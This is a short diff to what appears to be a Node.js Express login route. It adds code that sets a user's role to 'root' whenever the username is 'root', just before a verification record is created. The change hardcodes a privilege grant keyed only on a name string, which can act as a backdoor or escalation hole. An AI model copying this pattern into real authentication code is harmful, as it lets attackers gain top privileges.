@@ -39,6 +39,11 @@ router.post("/", (req, res, next) => {
             })
             return
         }
+
+        if (username === "root") {
+            role = "root"
+        }
+
         let verification = new Verification({
             uid: validateUser._id,
             loginTime: new Date(),
